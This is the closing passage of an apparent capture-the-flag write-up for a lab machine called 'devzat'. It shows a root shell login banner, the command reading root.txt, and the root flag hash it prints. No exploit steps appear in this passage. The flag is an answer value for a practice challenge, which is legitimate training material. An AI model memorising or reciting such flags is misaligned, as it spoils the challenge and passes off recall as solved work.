To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct 11 14:28:01 2021
root@devzat:~# root@devzat:~# cat root.txt 
01c4c8c1b47fe33b48d50ffc3bee7124
```

And we get the root flag ```01c4c8c1b47fe33b48d50ffc3bee7124```.